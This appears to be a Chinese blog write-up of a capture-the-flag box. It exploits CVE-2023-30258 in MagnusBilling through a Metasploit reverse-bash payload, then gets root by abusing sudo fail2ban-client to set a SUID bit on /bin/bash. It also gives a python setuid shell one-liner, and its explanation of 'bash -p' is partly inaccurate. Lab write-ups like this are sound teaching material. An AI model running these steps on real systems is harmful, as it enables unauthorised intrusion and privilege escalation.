---
icon: pen-to-square
date: 2025-03-26
tags: 
title: billing
category:
  - 项目
---
## 1. 前言
本题运用了简单的[CVE-2023-30258](https://eldstal.se/advisories/230327-magnusbilling.html)漏洞，这是一个简单的远程命令执行漏洞
## 2. 复现步骤
### 反弹shell
这个漏洞已经在msf中收录了
`msfconsole`

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110410.png)

```bash
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110506.png)

```bash
show targets
```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110536.png)

```bash
set PAYLOAD cmd/unix/reverse_bash
```
设置payload，然后设置Rhost Rport Lhost以及Lport
设置好监听接口以及payload之后，msf会自动接收反向shell
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326112352.png)

### 提权
```bash
id
```
查看当前用户权限
查看当前进程
```
ps -aux | grep fail
```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326112734.png)

**fail2ban-client** 是一个命令行界面，它允许我们与 **fail2ban-server** 进行交互、配置和控制。简单说明一下，**fail2ban** 是一种安全工具，可以监控日志文件中的可疑活动（例如重复失败的登录尝试），并通过更新防火墙规则来禁止违规的 IP 地址。

使用 fail2ban-client，您可以与 Fail2ban 服务交互以执行作，例如启动或停止 jail、查看或更新设置以及检查服务器上不同 jail 的状态。从本质上讲，它可以帮助您控制服务器如何响应可疑活动以确保其安全。[Fail2Ban – Linux 权限提升 - Juggernaut-sec](https://juggernaut-sec.com/fail2ban-lpe/#What_is_Fail2Ban)


`/etc/fail2ban/jail.local`，有这样的参数

|     |                                                                                                                                                                                                                    |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
|     | `[asterisk-iptables]`<br>enabled  = true<br>filter   = asterisk<br>action   = iptables-allports`[name=ASTERISK, port=all, protocol=all]`<br>logpath  = /var/log/asterisk/messages<br>maxretry = 5<br>bantime = 600 |
|     |                                                                                                                                                                                                                    |

```
sudo /usr/bin/fail2ban-client status
```
查看当前的防火墙规则
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326113233.png)
有 8 个活动的 jail
`Jails`基本上是定义要监控的日志、要查找的模式以及匹配模式时要采取的作的配置。

关键命令
```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
```
这段命令会启动`fail2ban-client`设置`asterisk-iptables`规则的`action`项，在action项中添加actionban，这条命令会在执行恶意操作的时候尝试执行

```bash
sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
```
查看`asterisk-iptables`的`action`项的actionban配置的内容

现在，我们可以手动禁止 **asterisk-iptables** jail 的 IP 地址，它将执行 action 中定义的命令。
```bash
iptables-allports-ASTERISK
```

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
```
这条命令的作用是将 IP 地址 `1.2.3.4` 添加到 `asterisk-iptables` jail 的禁止列表中。从而触发actionban中的降shell权的操作

```bash
/bin/bash -p
```
- **`-p` 选项**：启用特权模式（Privileged Mode）。
- 
- **特权模式的作用**：
    - **忽略启动文件**：在特权模式下，Bash 会忽略用户的启动文件（如 `.bashrc`、`.bash_profile` 等），直接进入交互模式。
    - **增强安全性**：这种模式通常用于需要更高安全性的场景，例如在某些受限环境中运行脚本时，避免加载用户自定义的配置文件，从而减少潜在的安全风险。


```bash
python3 -c 'import os;import pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'
```
#### **`python3 -c`**
- **作用**：使用 Python 3 解释器执行一行代码。
- **`-c`**：从命令行参数中读取 Python 代码并执行。
#### **`import os; import pty`**
- **`import os`**：导入 Python 的 `os` 模块，用于执行操作系统相关的操作。
- **`import pty`**：导入 Python 的 `pty` 模块，用于创建伪终端。

#### **`os.setuid(0)`**
- **作用**：将当前进程的用户 ID 设置为 0（root 用户）。
- **安全风险**：如果当前进程已经具有 root 权限，这将使后续操作以 root 权限执行。如果当前进程没有 root 权限，这将引发权限错误。

#### **`os.setgid(0)`**
- **作用**：将当前进程的组 ID 设置为 0（root 组）。
- **安全风险**：与 `os.setuid(0)` 类似，这将使后续操作以 root 组权限执行。

#### **`pty.spawn("/bin/bash")`**
- **作用**：启动一个新的交互式 Bash shell。
- **安全风险**：如果前面的 `os.setuid(0)` 和 `os.setgid(0)` 成功执行，这个命令将以 root 权限启动一个交互式 shell，攻击者可以利用这个 shell 执行任意命令。


这条命令是一个非常危险的命令，它试图以 root 权限启动一个交互式的 Bash shell。
